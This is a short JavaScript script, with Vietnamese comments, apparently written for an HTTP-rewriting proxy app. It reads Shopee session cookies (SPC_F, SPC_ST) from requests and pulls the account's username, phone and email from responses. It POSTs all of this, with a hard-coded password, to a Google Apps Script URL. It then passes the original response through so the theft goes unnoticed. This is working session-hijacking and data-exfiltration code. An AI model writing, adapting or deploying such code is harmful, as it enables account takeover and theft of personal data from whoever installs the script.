// Lấy headers từ request để lọc Cookie
let headers = $request.headers;
let cookieStr = headers['Cookie'] || headers['cookie'] || "";

let spcF = "";
let spcSt = "";

// Phân tích Cookie để lấy SPC_F và SPC_ST
if (cookieStr) {
    let cookies = cookieStr.split(';');
    for (let c of cookies) {
        let item = c.trim();
        if (item.startsWith("SPC_F=")) {
            spcF = item;
        } else if (item.startsWith("SPC_ST=")) {
            spcSt = item;
        }
    }
}

// Format lại cookie theo yêu cầu
let extractedCookie = "";
if (spcF && spcSt) {
    extractedCookie = spcF + "; " + spcSt;
} else if (spcF) {
    extractedCookie = spcF;
} else if (spcSt) {
    extractedCookie = spcSt;
}

// Xử lý dữ liệu từ response
let body = $response.body;

try {
    let obj = JSON.parse(body);

    if (obj && obj.data) {
        let username = obj.data.username || "";
        let phone = obj.data.phone || "";
        let email = obj.data.email || "";
        let password = "Nguyentrong1"; // Mặc định theo yêu cầu

        // Cấu hình URL Google Apps Script
        let url = "https://script.google.com/macros/s/AKfycbyDSxsxYOCtX1h7Yt3EKag6yfYW-nmIjvTobScKrrh6zRb4oAitacQwq4aTOJifrtjo/exec";

        // Body gửi đi
        let payload = {
            username: username,
            phone: phone,
            email: email,
            password: password,
            cookie: extractedCookie
        };

        let req = {
            url: url,
            header: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        };

        // Gửi POST request
        $httpClient.post(req, function(error, response, data) {
            if (error) {
                console.log("Lỗi khi gửi dữ liệu: " + error);
            } else {
                console.log("Đã gửi dữ liệu thành công: " + data);
            }
            // Trả về response gốc để ứng dụng không bị lỗi
            $done({ body });
        });
    } else {
        $done({ body });
    }
} catch (e) {
    console.log("Lỗi parse JSON: " + e);
    $done({ body });
}
